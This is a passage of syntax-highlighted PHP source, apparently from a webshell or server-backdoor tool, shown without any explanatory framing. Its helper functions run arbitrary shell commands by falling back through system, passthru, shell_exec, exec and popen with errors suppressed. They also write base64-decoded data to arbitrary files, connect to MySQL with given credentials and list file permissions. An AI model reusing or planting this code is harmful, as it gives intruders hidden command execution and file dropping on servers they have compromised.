<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   @ob_start();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@system</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cfe</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = @ob_get_contents();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   @ob_end_clean();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(function_exists(<span style="color: #8abeb7;">'passthru'</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   @ob_start();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@passthru</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cfe</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = @ob_get_contents();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   @ob_end_clean();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(function_exists(<span style="color: #8abeb7;">'shell_exec'</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = @shell_exec(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cfe</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(function_exists(<span style="color: #8abeb7;">'exec'</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@exec</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cfe</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = join(<span style="color: #8abeb7;">"\n"</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>(@is_resource(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span> = <span style="color: #81a2be;">@popen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cfe</span>,<span style="color: #8abeb7;">"r"</span>))) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #81a2be;">!</span><span style="color: #81a2be;">@feof</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span> .= <span style="color: #81a2be;">@fread</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>,1024);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@pclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">res</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">which</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pr</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span> = execute(<span style="color: #8abeb7;">"which </span><span style="color: #f0c674;">$pr</span><span style="color: #8abeb7;">"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pr</span>);<span style="color: #de935f; background-color: #373b41;"> </span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">cf</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">text</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fname</span>,<span style="color: #8abeb7;">'w'</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fputs</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,@base64_decode(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">text</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dirsize</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span> = <span style="color: #81a2be;">@opendir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">size</span> = 0;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span> = <span style="color: #81a2be;">@readdir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span> != <span style="color: #8abeb7;">'.'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span> != <span style="color: #8abeb7;">'..'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">size</span> += @is_dir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>) ? dirsize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>) : <span style="color: #81a2be;">@filesize</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">path</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@closedir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">size</span>;
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">debuginfo</span>() {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">starttime</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mtime</span> = explode(<span style="color: #8abeb7;">' '</span>, microtime());
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">totaltime</span> = number_format((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mtime</span>[1] + <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mtime</span>[0] - <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">starttime</span>), 6);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'Processed in '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">totaltime</span>.<span style="color: #8abeb7;">' second(s)'</span>;
}

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">mydbconn</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>=<span style="color: #8abeb7;">''</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>=<span style="color: #8abeb7;">''</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span>=<span style="color: #8abeb7;">'3306'</span>)<span style="text-decoration: underline;"> {</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charsetdb</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   @ini_set(<span style="color: #8abeb7;">'mysql.connect_timeout'</span>, 5);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">link</span> = @mysql_connect(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>.<span style="color: #8abeb7;">':'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">link</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span>@mysql_select_db(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">link</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h2&gt;Database selected has error&lt;/h2&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">link</span> &amp;&amp; mysql_get_server_info() &gt; <span style="color: #8abeb7;">'4.1'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span> &amp;&amp; in_array(strtolower(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>), <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charsetdb</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   q(<span style="color: #8abeb7;">"SET character_set_connection=</span><span style="color: #f0c674;">$charset</span><span style="color: #8abeb7;">, character_set_results=</span><span style="color: #f0c674;">$cha</span><span style="color: #f0c674; text-decoration: underline;">rset</span><span style="color: #8abeb7; text-decoration: underline;">, character_set_client=binary;"</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">link</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">link</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">s_array</span>(&amp;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (is_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">k</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">k</span>] = s_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">v</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span> (is_string(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span> = stripslashes(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#28165;&#38500;HTML&#20195;&#30721;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">html_clean</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span> = htmlspecialchars(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span> = str_replace(<span style="color: #8abeb7;">"\n"</span>, <span style="color: #8abeb7;">"&lt;br /&gt;"</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span> = str_replace(<span style="color: #8abeb7;">"  "</span>, <span style="color: #8abeb7;">"&amp;nbsp;&amp;nbsp;"</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span> = str_replace(<span style="color: #8abeb7;">"\t"</span>, <span style="color: #8abeb7;">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">content</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#26435;&#38480;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getChmod</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> substr(base_convert(<span style="color: #81a2be;">@fileperms</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>),10,8),-4);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getPerms</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> = <span style="color: #81a2be;">@fileperms</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0xC000) === 0xC000) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'s'</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x4000) === 0x4000) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'d'</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0xA000) === 0xA000) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'l'</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x8000) === 0x8000) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'-'</span>;}<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x6000) === 0x6000) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'b'</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x2000) === 0x2000) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'c'</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">elseif</span> ((<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x1000) === 0x1000) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'p'</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span> {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span> = <span style="color: #8abeb7;">'?'</span>;}

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'read'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00400) ? <span style="color: #8abeb7;">'r'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'write'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00200) ? <span style="color: #8abeb7;">'w'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00100) ? <span style="color: #8abeb7;">'x'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'read'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00040) ? <span style="color: #8abeb7;">'r'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'write'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00020) ? <span style="color: #8abeb7;">'w'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'execute'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00010) ? <span style="color: #8abeb7;">'x'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
